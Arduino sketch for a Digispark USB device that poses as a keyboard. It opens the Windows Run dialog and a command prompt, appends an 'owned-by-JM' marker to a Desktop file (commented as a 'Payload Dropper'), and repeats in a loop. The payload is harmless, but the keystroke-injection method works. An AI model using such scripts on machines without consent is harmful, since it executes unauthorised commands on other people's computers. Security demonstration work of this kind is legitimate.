#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("cmd /k cd %UserProfile%/Desktop");
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("echo owned-by-JM >> owned.txt"); //Payload Dropper
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("exit"); 
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
